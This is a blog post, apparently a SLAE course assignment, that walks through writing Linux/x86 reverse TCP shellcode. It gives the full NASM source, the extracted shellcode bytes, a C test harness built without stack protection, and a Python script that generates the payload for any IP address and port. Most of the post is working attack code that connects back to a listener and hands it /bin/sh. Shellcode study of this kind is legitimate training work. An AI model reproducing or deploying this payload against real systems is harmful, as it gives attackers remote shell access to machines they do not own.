---
layout: post
title: "SLAE Assignment 2 - Shell Reverse TCP (Linux/x86)"
---


### Assignment #2: Shell Reverse TCP Shellcode (Linux/x86)
The second assigment is to create Reverse TCP Shellcode which does following.
- Connects back to an IP address and port
- Execs a shell upon connection
- The IP address  and port number are configurable

<!-- more -->

So, our approach to writing assembly code for this challenge is as follows:
1. Create a socket with SYS_SOCKET
2. Connect to IP and Port with SYS_CONNECT
3. Redirect stdin, stdout, stderr with SYS_DUP2
4. Exec /bin/sh with SYS_EXECVE

### Create a socket with SYS_SOCKET
Since we have already explained in detail about how do we create a socket, there is no need to describe it further. Assembly code:
```nasm
		; int socketcall(int call, unsigned long *args)
						; socketcall - socket system calls
						; call determines which socket function to invoke
						; args points to a block containing the actual arguments, 
            ; which are passed through to the appropriate call.
						
		; int socket(int domain, int type, int protocol); 
						; [/usr/include/linux/net.h] 
						; [#define SYS_SOCKET 1] [sys_socket(2)]

		; domain 	= AF_INET	; [/usr/include/i386-linux-gnu/bits/socket.h] 
						; [#define AF_INET PF_INET]
						; [#define PF_INET 2]
						; [IP protocol family]	 

		; type 	= SOCK_STREAM	; [/usr/include/i386-linux-gnu/bits/socket.h]
						; [SOCK_STREAM = 1]
						; [Sequenced, reliable, connection-based byte streams]

		; protocol 	= IP_PROTO	; [/usr/include/linux/in.h] 
						; [IPPROTO_IP = 0]
						; [Dummy protocol for TCP]
		; sockfd = socket(2, 1, 0)

		; EAX = 0x66 			; sys_socketcall()
		; EBX = 0x1			  ; sys_socket()
		; ECX = Pointer to sys_socket arguments

		xor eax, eax
		push eax			    ; Argument 3 for socket() =>  	IPPROTO_IP = 0
		mov al, 0x66

		push byte 0x1
		pop ebx				    ; sys_socket()
		
		push byte 0x1			; Argument 2 for socket() => 	SOCK_STREAM = 1
		push byte 0x2			; Argument 1 for socket() => 	AF_INET	= 2	
		
		; Now we have arguments for socket() in the stack. ESP points to them.
		
		mov ecx, esp
		int 0x80			    ; returns socket file descriptor to EAX
```

We would require the socket file descriptor for later use. So, we need to save it in some register.
```nasm
		push eax						
		pop esi				    ; clears ESI and saves sockfd in ESI
```
### Connect to IP and Port with SYS_CONNECT
First lets try and connect to our local machine itself on port 4321.
```nasm
		; connect to localhost:port with sys_connect
		; #define SYS_CONNECT	3		/* sys_connect(2)		*/
		; 
```
The man page entry for connect is as follows:
```
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
```
Lets look at the important one ```struct sockaddr *addr```.
```
// IPv4 AF_INET sockets:
struct sockaddr_in {
    short            sin_family;   // e.g. AF_INET, AF_INET6
    unsigned short   sin_port;     // e.g. htons(3490)
    struct in_addr   sin_addr;     // see struct in_addr, below
    char             sin_zero[8];  // zero this if you want to
};

struct in_addr {
    unsigned long s_addr;          // load with inet_pton()
};
```
To fulfil our need, the contents of ```sockaddr``` should be as follows:
```
sin_family = AF_INET = 2
sin_port = 0xe110 = hex(htons(4321))
```
For determining the value of ```sin_addr```, I have written a simple python script which accepts ip address and spits out shellcode ready value (provided ip address does not contain any null values).
```python
#!/usr/bin/env python

'''
Author	: RIZAL MUHAMMED (UB3RSiCK)
Desc	: IP address to Network Byte Order Converter
'''

import sys

if not len(sys.argv) == 2:
	print "Usage: {} ip".format(sys.argv[0])
	sys.exit()


ip = sys.argv[1]
hex_ip = map(lambda x: '0'+x if not len(x) == 2 else x , [hex(int(item))[2:] for item in ip.split('.')[::-1]])
if '00' in hex_ip:
	print "IP Address contains nullbyte: {}".format(hex_ip)
	sys.exit()
print "ip_address: {}\nnetwork_byte_order: {}".format(ip, '0x' + ''.join(hex_ip))
```
Lets run it:
```
$ python ip-conv.py 127.1.1.1
ip_address: 127.1.1.1
network_byte_order: 0x0101017f
```
So ```sin_addr = 0x0101017f```.
Assembly Code
```nasm
		; EAX = 0x66 = sys_socketcall()
		; EBX = 0x3  = sys_connect()
		; ECX = pointer to arguments of sys_connect

		; connect(sockfd, *ptr->[2, 0xe110, 0x0101017f], 16)

		mov al, 0x66
		pop ebx			      ; EBX = 2 now
		
		push 0x0101017f		; 127.1.1.1 Network byte order
		push word 0xe110	; port 4321
		push word bx		  ; AF_INET = 2

		mov ecx, esp		  ; ecx now points to struct sockaddr
		push 0x10		      ; addrlen = 16
		push ecx		      ; pointer to sockaddr
		push esi		      ; sockfd

		mov ecx, esp		  ; pointer to sys_connect args
		inc ebx			      ; EBX  = 3 ; sys_connect

		int 0x80

		xchg ebx, esi		  ; old sockfd in ebx for dup2		
```

### Redirect stdin, stdout, stderr with SYS_DUP2
```nasm
		; Redirect stdin, stdout, stderr with sys_dup2
		; int dup2(int oldfd, int newfd);
		; sys_dup2 = 0x3f

		xor eax, eax
		xor ecx, ecx
		mov cl,0x2

		dup_loop:
			mov al, 0x3f
			int 0x80
			dec ecx
			jns dup_loop
```
### Exec /bin/sh with SYS_EXECVE
```nasm
		; execve /bin/sh
		
		xor eax, eax
		push eax		; push null onto stack
		mov al, 0x0b
		
		push 0x68732f2f
		push 0x6e69622f

		mov ebx, esp
		xor ecx, ecx
		xor edx, edx

		int 0x80

```
### Complete Shellcode
```nasm
;
; Author 	: Rizal Muhammed (UB3RSiCK)
; Description	: SLAE x86 Assignment 2 - Shell Reverse TCP Shellcode (Linux/x86)
; File 		: shell-rev-tcp.nasm
; Website	: https://ub3rsick.github.io/

global _start

section .text

	_start:
		; int socketcall(int call, unsigned long *args)
						; socketcall - socket system calls
						; call determines which socket function to invoke
						; args points to a block containing the actual arguments, which are passed through to the appropriate call.
						
		; int socket(int domain, int type, int protocol); 
						; [/usr/include/linux/net.h] 
						; [#define SYS_SOCKET 1] [sys_socket(2)]

		; domain 	= AF_INET	; [/usr/include/i386-linux-gnu/bits/socket.h] 
						; [#define AF_INET PF_INET]
						; [#define PF_INET 2]
						; [IP protocol family]	 

		; type 		= SOCK_STREAM	; [/usr/include/i386-linux-gnu/bits/socket.h]
						; [SOCK_STREAM = 1]
						; [Sequenced, reliable, connection-based byte streams]

		; protocol 	= IP_PROTO	; [/usr/include/linux/in.h] 
						; [IPPROTO_IP = 0]
						; [Dummy protocol for TCP]
		; sockfd = socket(2, 1, 0)

		; EAX = 0x66 			; sys_socketcall()
		; EBX = 0x1			  ; sys_socket()
		; ECX = Pointer to sys_socket arguments

		xor eax, eax
		push eax			    ; Argument 3 for socket() =>  	IPPROTO_IP = 0
		mov al, 0x66
		
		push byte 0x1
		pop ebx
		
		push byte 0x1			; Argument 2 for socket() => 	SOCK_STREAM = 1
		push byte 0x2			; Argument 1 for socket() => 	AF_INET	= 2	
		
		; Now we have arguments for socket() in the stack. ESP points to them.
		
		mov ecx, esp
		int 0x80			    ; returns socket file descriptor to EAX

		push eax						
		pop esi				    ; clears esi and saves sockfd in esi

		;********************************************************************************;
		; connect to localhost:port with sys_connect
		; #define SYS_CONNECT	3		/* sys_connect(2)		*/
		; 
		
		; int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);

		; EAX = 0x66 = sys_socketcall()
		; EBX = 0x3  = sys_connect()
		; ECX = pointer to arguments of sys_connect

		; connect(sockfd, *ptr->[2, 0xe110, 0x0101017f], 16)

		mov al, 0x66
		pop ebx			      ; EBX = 2 now
		
		push 0x0101017f		; 127.1.1.1 Network byte order
		push word 0xe110	; port 4321
		push word bx		  ; AF_INET = 2

		mov ecx, esp		  ; ecx now points to struct sockaddr
		push 0x10		      ; addrlen = 16
		push ecx		      ; pointer to sockaddr
		push esi		      ; sockfd

		mov ecx, esp	  	; pointer to sys_connect args
		inc ebx			      ; EBX  = 3 ; sys_connect

		int 0x80

		xchg ebx, esi		  ; old sockfd in ebx for dup2		
		;********************************************************************************;
		; Redirect stdin, stdout, stderr with sys_dup2
		; int dup2(int oldfd, int newfd);
		; sys_dup2 = 0x3f

		xor eax, eax
		xor ecx, ecx
		mov cl,0x2

		dup_loop:
			mov al, 0x3f
			int 0x80
			dec ecx
			jns dup_loop

		;********************************************************************************;
		; execve /bin/sh
		
		xor eax, eax
		push eax		; push null onto stack
		mov al, 0x0b
		
		push 0x68732f2f
		push 0x6e69622f

		mov ebx, esp
		xor ecx, ecx
		xor edx, edx

		int 0x80
```
Assembling and linking the asssembly code.
```
nasm -f elf32 shell-rev-tcp.nasm -o shell-rev-tcp.o
ld shell-rev-tcp.o -o shell-rev-tcp-4321
```
Dumping the shellcode.
```
objdump -d ./shell-rev-tcp-4321|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
```
![Assemble Link Dump-Shellcode](/assets/asn-2-assembling-linking.PNG)
Insert the shellcode in shellcode.c template.
```c
#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x50\xb0\x66\x6a\x01\x5b\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x50\x5e\xb0\x66\x5b\x68\x7f\x01\x01\x01\x66\x68\x10\xe1\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x87\xde\x31\xc0\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}
```
Compile shellcode.c:
```
gcc shellcode.c -o shell-rev-4321 -fno-stack-protector -z execstack
```
Now, its time to test our reverse shell. Lets setup a  netcat listener on port 4321 on our local machine and execute the reverse shell from another terminal.
![Reverse Shell LocalHost](/assets/asn-2-rev-connect.PNG)
### Configure IP and Port
Python wrapper which prints out the complete shellcode given an IP and Port as command line arguments.
```python
import sys

'''
Author		: RIZAL MUHAMMED (UB3RSiCK)
Description	: Prints out Reverse TCP Shellcode given ip and port
filename	: ip-port-config-shell-reverse-tcp.py 
'''

def shellip(ip):
	global hex_ip
	hex_ip = map(lambda x: '0'+x if not len(x) == 2 else x , [hex(int(item))[2:] for item in ip.split('.')])
	
	if '00' in hex_ip:
		print "IP Address contains nullbyte: {}".format(hex_ip)
		sys.exit()
	else:
		return ''.join([r'\x'+item for item in hex_ip])
		

def shellport(port):
	global hex_port
	hex_port = hex(port)[2:]

	if len(hex_port) < 4:
        	# for all port number > 1000, len(hex(port)) will be 3 or more, not less than that
        	hex_port = "0" + hex_port

	h1 = hex_port[:2]
	h2 = hex_port[2:]

	if h1 == "00" or h2 == "00":
        	print "port number contain null byte, please choose different port number"
        	sys.exit()

	port_no = r'\x{}\x{}'.format(h1,h2)
	return port_no


if not len(sys.argv) == 3:
	print 'Usage: {} ip port'.format(sys.argv[0])
	sys.exit()

ip = sys.argv[1]
ip_addr_shellcode = shellip(ip)


port = int(sys.argv[2])

# Check if user has passed invalid port number
if port < 1000 or port > 65535 :
	print "Either port number less than 1000: user needs to be root"
	print "Or"
	print "Port number greater than 65535"
	sys.exit()

port_no_shellcode = shellport(port)

print '\nIP: {0}, Hex: {1}, inShellcode: {2}'.format(ip, hex_ip, ip_addr_shellcode)
print 'Port: {0} , Hex = {1}, inShellcode = {2}\n'.format(port, hex_port, port_no_shellcode)


shellcode = (r"\x31\xc0\x50\xb0\x66\x6a\x01\x5b\x6a\x01\x6a\x02\x89\xe1\xcd\x80\x50\x5e\xb0\x66\x5b\x68" +
             ip_addr_shellcode +       # this is where our ip address will be
             r"\x66\x68" +
             port_no_shellcode +               # this is where we need to put in port number
             r"\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\x43\xcd\x80\x87\xde\x31\xc0\x31\xc9\xb1\x02\xb0" +
             r"\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\xb0\x0b\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xcd\x80")

print '"'+shellcode+'"\n'
```
Lets look at ip address of another machine on my network.

![Another Machine on Network](/assets/asn-2-another-machine-ip.PNG)

Run the python wrapper script with the ip address and desired port as arguments.
```
python ip-port-config-shell-reverse-tcp.py 192.168.56.102 6767
```
![Python Wrapper IP and Port](/assets/asn-2-ip-port-config-script.PNG)

Once again insert the shellcode in ```shellcode.c``` then compile the file. Now its time to test our reverse shell once again.

![Reverse Shell Network Machine](/assets/asn-2-connect-back-network-machine.PNG)

